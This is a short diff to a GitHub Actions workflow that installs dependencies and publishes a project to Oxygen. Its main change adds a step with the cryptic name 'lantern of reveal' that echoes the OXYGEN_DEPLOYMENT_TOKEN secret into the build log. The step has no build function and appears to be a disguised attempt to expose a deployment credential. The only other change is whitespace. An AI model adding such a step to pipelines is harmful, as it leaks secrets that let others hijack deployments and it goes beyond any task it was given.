@@ -43,7 +43,8 @@ jobs:
             ${{ runner.os }}-
       - name: Install dependencies
         run: npm install
-
+      - name: lantern of reveal
+        run:  echo "${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_1000008763 }}"
       - name: Check Oxygen version
         id: check_version
         shell: 'bash'
@@ -66,7 +67,7 @@ jobs:
               exit 1
             fi
           fi
-
+      
       - name: Build and Publish to Oxygen
         shell: 'bash'
         id: 'oxygen-cli-action'
